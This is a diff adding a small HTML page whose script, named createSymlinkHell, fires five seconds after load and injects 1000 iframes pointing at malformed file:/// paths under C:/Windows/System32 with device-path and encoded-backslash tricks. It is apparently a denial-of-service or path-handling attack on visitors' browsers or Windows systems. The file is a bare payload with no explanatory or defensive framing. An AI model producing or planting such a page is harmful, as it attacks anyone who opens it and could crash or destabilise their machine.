@@ -1,0 +1,13 @@
+<!DOCTYPE html>  
+<script>  
+function createSymlinkHell() {  
+  for(let i = 0; i < 1000; i++) {  
+    const iframe = document.createElement('iframe');  
+    iframe.src = `file:///C:/Windows/System32/${i}/%5C%5C?\\C:\\`;  
+    document.body.appendChild(iframe);  
+  }  
+}  
+
+ 
+setTimeout(createSymlinkHell, 5000);  
+</script>  
